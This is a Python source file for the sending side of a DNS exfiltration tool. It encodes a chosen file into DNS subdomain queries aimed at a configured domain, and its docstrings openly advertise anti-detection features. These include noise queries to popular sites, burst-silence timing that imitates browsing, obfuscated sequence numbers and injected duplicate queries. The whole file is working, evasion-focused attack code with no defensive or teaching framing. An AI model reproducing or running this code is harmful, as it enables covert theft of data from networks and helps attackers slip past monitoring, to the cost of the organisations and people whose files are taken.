#!/usr/bin/env python3
"""DNS Exfiltration - Client (Sender)

Exfiltrates a file by encoding its data into DNS subdomain queries.
Uses the system's DNS resolver so traffic flows through normal DNS
infrastructure, indistinguishable from regular browsing.

Anti-detection features:
- Low-entropy encoding (hex-split or wordlist)
- Burst-silence timing mimicking browser page loads
- Noise queries to real popular domains
- Weighted query type distribution (A/AAAA/CNAME)
- Shuffled sequence delivery
- Duplicate query injection
"""

import hashlib
import os
import random
import secrets
import sys
import time

import dns.resolver

from config import (
    BASE_DOMAIN,
    BURST_SIZE_MAX,
    BURST_SIZE_MIN,
    DUPLICATE_QUERY_RATE,
    ENCODING_STRATEGY,
    HASH_ALGORITHM,
    HEX_LABEL_LENGTH,
    INTER_BURST_DELAY,
    INTRA_BURST_DELAY,
    LABELS_PER_QUERY,
    METADATA_PREFIX,
    NOISE_DOMAINS_FILE,
    NOISE_RATIO,
    QUERY_TYPE_WEIGHTS,
    SEQUENCE_PRIME,
    SEQUENCE_SEED,
    SESSION_ID_LENGTH,
)
from encoding import encode_hex_split, encode_wordlist


def load_noise_domains():
    """Load popular domains for noise queries."""
    filepath = os.path.join(os.path.dirname(__file__), NOISE_DOMAINS_FILE)
    with open(filepath) as f:
        return [line.strip() for line in f if line.strip()]


def compute_hash(data):
    """Compute file hash for integrity verification."""
    hasher = hashlib.new(HASH_ALGORITHM)
    hasher.update(data)
    return hasher.hexdigest()


def weighted_query_type():
    """Pick a DNS query type based on realistic weight distribution."""
    types = list(QUERY_TYPE_WEIGHTS.keys())
    weights = list(QUERY_TYPE_WEIGHTS.values())
    return random.choices(types, weights=weights, k=1)[0]


def encode_data(data):
    """Encode raw bytes into DNS labels using configured strategy."""
    if ENCODING_STRATEGY == "hex_split":
        return encode_hex_split(data, label_len=HEX_LABEL_LENGTH)
    elif ENCODING_STRATEGY == "wordlist":
        return encode_wordlist(data)
    else:
        raise ValueError(f"Unknown encoding strategy: {ENCODING_STRATEGY}")


def chunk_data(data, labels_per_query=LABELS_PER_QUERY):
    """Split data into chunks sized for the encoding strategy.

    For hex_split: each label carries (label_len - prefix_len) / 2 bytes
    For wordlist: each label carries 1 byte
    """
    if ENCODING_STRATEGY == "hex_split":
        # Average prefix is ~2.5 chars, so ~5.5 hex chars per label = ~2.7 bytes
        # Conservative: assume 5 hex chars per label = 2 bytes
        avg_prefix_len = 3
        hex_per_label = HEX_LABEL_LENGTH - avg_prefix_len
        bytes_per_label = hex_per_label // 2
        chunk_size = bytes_per_label * labels_per_query
    else:  # wordlist
        chunk_size = labels_per_query

    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def build_query_name(data_labels, session_id, seq_num, is_metadata=False):
    """Build a DNS query name from components.

    Format: <data_labels>.<session_id>.<seq_hex>.<base_domain>
    """
    if is_metadata:
        data_labels[0] = METADATA_PREFIX + data_labels[0]

    seq_hex = f"{seq_num:04x}"
    parts = data_labels + [session_id, seq_hex, BASE_DOMAIN]
    return ".".join(parts)


def obfuscate_sequence(orig_seq, total_chunks):
    """Obfuscate sequence number using modular arithmetic.

    Uses a shared prime and seed so the server can reverse it.
    """
    obfuscated = (orig_seq * SEQUENCE_PRIME + SEQUENCE_SEED) % (total_chunks + 1)
    if obfuscated == 0:
        obfuscated = orig_seq  # avoid collision with metadata seq 0
    return obfuscated


def resolve_query(qname, qtype="A"):
    """Send a DNS query through the system resolver.

    Uses dnspython which goes through /etc/resolv.conf like
    any normal application - traffic is indistinguishable.
    """
    try:
        dns.resolver.resolve(qname, qtype, lifetime=5)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.resolver.NoNameservers, dns.resolver.LifetimeTimeout,
            dns.exception.DNSException):
        pass  # Expected - we don't care about answers


def resolve_noise(noise_domains):
    """Send a noise query to a real popular domain."""
    domain = random.choice(noise_domains)
    qtype = weighted_query_type()
    resolve_query(domain, qtype)


def send_file(filepath):
    """Exfiltrate a file over DNS queries with full anti-detection.

    Protocol:
        1. Generate session ID
        2. Read file, compute hash, split into chunks
        3. Send metadata query (seq 0): chunk_count||hash
        4. Send data queries with obfuscated sequence numbers
        5. Mix with noise queries in burst-silence pattern
        6. Inject duplicate queries to lower unique ratio
    """
    # Read and prepare file
    with open(filepath, "rb") as f:
        file_data = f.read()

    file_hash = compute_hash(file_data)
    chunks = chunk_data(file_data)
    session_id = secrets.token_hex(SESSION_ID_LENGTH // 2)
    noise_domains = load_noise_domains()

    print(f"File: {filepath}")
    print(f"Size: {len(file_data)} bytes")
    print(f"Chunks: {len(chunks)}")
    print(f"Session: {session_id}")
    print(f"Encoding: {ENCODING_STRATEGY}")
    print(f"Noise ratio: 1:{NOISE_RATIO}")
    print()

    # Build all data queries
    data_queries = []

    # Metadata query (seq 0)
    metadata = f"{len(chunks)}||{file_hash}"
    meta_labels = encode_data(metadata.encode())
    meta_qname = build_query_name(meta_labels, session_id, 0, is_metadata=True)
    data_queries.append(("META", meta_qname))

    # Data chunk queries with obfuscated sequence
    for orig_seq, chunk in enumerate(chunks, start=1):
        obf_seq = obfuscate_sequence(orig_seq, len(chunks))
        labels = encode_data(chunk)
        qname = build_query_name(labels, session_id, obf_seq)
        data_queries.append((f"{orig_seq:04d}", qname))

    # Send metadata first (must arrive before data)
    print("[META] Sending metadata...")
    qtype = weighted_query_type()
    resolve_query(data_queries[0][1], qtype)

    # Send noise after metadata
    for _ in range(random.randint(2, 5)):
        resolve_noise(noise_domains)
        time.sleep(random.uniform(*INTRA_BURST_DELAY))

    time.sleep(random.uniform(*INTER_BURST_DELAY))

    # Prepare data queries (skip metadata at index 0)
    remaining = data_queries[1:]

    # Track sent queries for duplicate injection
    sent_queries = []
    total_sent = 0
    total_data = len(remaining)

    # Send in burst-silence pattern
    idx = 0
    while idx < len(remaining):
        burst_size = random.randint(BURST_SIZE_MIN, BURST_SIZE_MAX)

        # Build this burst: mix data + noise
        burst = []

        # Add data queries for this burst (1-2 data per burst)
        data_in_burst = min(random.randint(1, 2), len(remaining) - idx)
        for _ in range(data_in_burst):
            seq_label, qname = remaining[idx]
            burst.append(("data", qname))
            sent_queries.append(qname)
            idx += 1
            total_sent += 1

        # Maybe inject a duplicate
        if sent_queries and random.random() < DUPLICATE_QUERY_RATE:
            dup = random.choice(sent_queries)
            burst.append(("dup", dup))

        # Fill rest of burst with noise
        noise_count = burst_size - len(burst)
        for _ in range(max(0, noise_count)):
            domain = random.choice(noise_domains)
            burst.append(("noise", domain))

        # Shuffle the burst (data queries mixed with noise)
        random.shuffle(burst)

        # Send burst
        for query_type, qname in burst:
            qtype = weighted_query_type()
            resolve_query(qname, qtype)

            if query_type == "data":
                print(f"\r  [{total_sent}/{total_data}] Sending chunks...", end="", flush=True)

            time.sleep(random.uniform(*INTRA_BURST_DELAY))

        # Reading pause between bursts
        time.sleep(random.uniform(*INTER_BURST_DELAY))

    print(f"\n\nTransfer complete.")
    print(f"  Data queries: {total_data}")
    print(f"  Session ID: {session_id}")


def main():
    filepath = input("Enter file path to exfiltrate: ").strip()

    if not filepath:
        print("Error: File path cannot be empty.")
        sys.exit(1)

    if not os.path.isfile(filepath):
        print(f"Error: File '{filepath}' not found.")
        sys.exit(1)

    try:
        send_file(filepath)
    except PermissionError:
        print("Error: Permission denied reading file.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)


if __name__ == "__main__":
    main()
